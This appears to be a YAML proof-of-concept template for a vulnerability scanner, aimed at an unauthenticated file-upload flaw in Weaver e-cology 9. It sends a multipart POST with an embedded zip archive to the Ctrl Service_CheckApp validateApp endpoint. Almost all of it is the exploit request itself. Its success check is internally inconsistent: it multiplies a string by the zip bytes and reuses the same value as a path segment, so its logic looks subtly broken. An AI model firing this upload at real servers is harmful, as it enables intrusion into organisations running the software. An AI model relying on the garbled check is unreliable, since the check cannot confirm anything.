name: ecology9-ctrl-file-upload
transport: http
set:
  r1: '".css"'
  r2: b"PK\x03\x04\x14\x00\x00\x00\x08\x00\xc8\x9b\x0bU\xc45\xd5\x9c\xac\x01\x00\x00m\x08\x00\x00\x05\x00\x00\x001\x2etxt\xedV\x5dk\xdb0\x14\x7d\x0f\xf8\x3f\xdc\x97\x0d\xbb\xf3\x97\x16\xb2n\x0ef\x84P\x9a\xd2\xa6\x1bm\xc6\xf6V\x14\xf9\xc6\xd6\x2aK\xaa\x24g\x26\xbf\x7er\xd3\x0c\xd6\xfe\x05\xa3\x83\xb8\xf7\x1e\xdds\x05z8\xba\xbc\xd8\x40\xc6\xb4\xcbZ\x2ai\x8d\xd9\x9e\x0a\x5eQ\x87\xe9o\xab\xbfZ\xd5\x19\x86\xd6\x19\x2e\xeb\xf2\xc4\xdcv\xed\x7bF5wC\x5e\x92w\x1fs\x2a\xaba\xb7\x8c\xf30\xb4\x28\x909\x9f\xdbn\x7b\xec\x0c\x85\xaa\xb9\xe4ULb\x12\xed\x8cj\x3d\xb92\xed\x1d\x1e\xe5\xd7\xcf\x83M\x14\x95\x84\xcc\x3c5b\xc4\x88\x11\x23F\xbc\x01\xac6\x9b\xef\x19II0Y\x29\xeb\x0a\x10\x8aQ\xd1\xf80\x98\x2c\x29k0Y\x2a\xe9\x8c\x12\x05\xb4\xb4O\xbc\xb1\x94y0\xf9\xa1kC\x2bL\xae\xa4E\xd6\x19L\xee\xf0\xa9\xf3\xbef\x0b\x20\x9e\xb5h\x92E\x8d\xd2\xcb\xad\xd5\x81\x0bA\xb3Y\x9aC\xb8\xa6\x8cK\xa7l3\x87\x2b\xe9P\x80\x2f\xc0\xb7\x7b\xf8\x05\x24\x7f\x20\xb3\x87\xf3\x08\x16Z\x0b\xfc\x89\xdbk\xee\xb2\xd9\xf4\x3c\x9d\x7e\x82\xf0z\xb5Y\xdf\xc4\x20\xf8\x23\xc2\x25\xb2G\x15\xc1\xb2\xf1\xb6\x87\x19\xc9\xa7i\x3e\x2c\xb8\xa7\x3bj\xf8KK0Y0\x86\xda\x8fw\xd8\xbb\xacq\xad\x88\xa9\x17\xe6\x8c\x3a\xaed\xd6\x0f\x95\x0f\xfd\xab\xaa\xcf\xe7Oe\x9e\x7e\x89y\x3b87\xdd\xf3\xddK\xf8\x07\xb7\xfaT\xd5\xb2\x8e\xcf\xb2\xb3\xe7\xa3\x9f\xff\x13\xb0\xbc\x96X\x25\xd8\xb3\x86\xca\x1a\xe7\xfbr\x3b\x3d\x2a\x9e\x2e\x94\x5cH\xa6\x2ao\xe1\x05\xd4\x07\xaec\xa8p\x27\xfc\x17\xe0\x1f\x7f\xe3\x1b\x3b\x3f\xa6\x80C\x93\x2co\xe3Cs\x12\xf0\xcf\x20\x91\x0ds\x0a\x60BY\xdf\x13L\xfe\x02PK\x01\x02\x3f\x00\x14\x00\x00\x00\x08\x00\xc8\x9b\x0bU\xc45\xd5\x9c\xac\x01\x00\x00m\x08\x00\x00\x05\x00\x24\x00\x00\x00\x00\x00\x00\x00\x20\x00\x00\x00\x00\x00\x00\x001\x2etxt\x0a\x00\x20\x00\x00\x00\x00\x00\x01\x00\x18\x00\x84\xa3\x12\xbau\xad\xd8\x01\x9f\x10\xeb\x2el\xb7\xd8\x01\x91\x89\x8c\xb8u\xad\xd8\x01PK\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00W\x00\x00\x00\xcf\x01\x00\x00\x00\x00"
  r3: b"\x0d"
rules:
  r0:
    request:
      method: POST
      path: /weaver/weaver.common.Ctrl/{{r1}}?arg0=com.cloudstore.api.service.Service_CheckApp&arg1=validateApp
      body: |
        ------WebKitFormBoundarywAfeTVV0NFYrxRI9{{r3}}
        Content-Disposition: form-data; name="uploadFile"; filename="test.zip"{{r3}}
        Content-Type: application/zip{{r3}}
        {{r3}}
        {{r2}}{{r3}}
        ------WebKitFormBoundarywAfeTVV0NFYrxRI9{{r3}}
      headers:
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundarywAfeTVV0NFYrxRI9
    expression: response.status == 200 && response.body.bcontains(bytes(string(r1 * r2)))
expression: r0()
detail:
  author: trganda
  links:
    - https://www.weaver.com.cn/cs/securityDownload.asp